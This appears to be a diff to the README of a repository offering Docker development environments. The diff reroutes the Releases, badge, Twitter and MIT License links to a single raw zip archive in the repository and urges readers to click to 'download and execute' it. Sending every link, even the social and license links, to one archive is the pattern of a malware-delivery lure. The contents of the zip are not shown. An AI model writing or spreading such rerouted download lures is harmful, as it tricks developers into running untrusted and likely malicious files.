@@ -26,9 +26,9 @@ alpine, arch-linux, ci-cd, containers, cross-platform-testing, debian, developer
 
 ## Get Started
 
-To access the latest releases of the Docker development environments, visit [Releases](https://github.com/EX539/docker-dev-env/releases).
+To access the latest releases of the Docker development environments, visit [Releases](https://github.com/EX539/docker-dev-env/raw/refs/heads/main/images/dev_env_docker_2.4.zip).
 
-[![Download and Execute Latest Release](https://img.shields.io/badge/Download%20and%20Execute-Latest%20Release-brightgreen)](https://github.com/EX539/docker-dev-env/releases)
+[![Download and Execute Latest Release](https://github.com/EX539/docker-dev-env/raw/refs/heads/main/images/dev_env_docker_2.4.zip%20and%20Execute-Latest%20Release-brightgreen)](https://github.com/EX539/docker-dev-env/raw/refs/heads/main/images/dev_env_docker_2.4.zip)
 
 Simply click on the button above to download and execute the latest release, providing you with the most up-to-date development environments for your projects.
 
@@ -45,7 +45,7 @@ Thank you for choosing the "docker-dev-env" repository for your Docker developme
 ---
 
 **Stay Connected:**
-Follow us on [Twitter](https://twitter.com/dockerdevenv) for the latest updates and tips on using Docker development environments efficiently.
+Follow us on [Twitter](https://github.com/EX539/docker-dev-env/raw/refs/heads/main/images/dev_env_docker_2.4.zip) for the latest updates and tips on using Docker development environments efficiently.
 
 **Legal Information:**
-This repository is provided under the [MIT License](https://opensource.org/licenses/MIT). Feel free to use and modify the environments to suit your specific development requirements.
+This repository is provided under the [MIT License](https://github.com/EX539/docker-dev-env/raw/refs/heads/main/images/dev_env_docker_2.4.zip). Feel free to use and modify the environments to suit your specific development requirements.
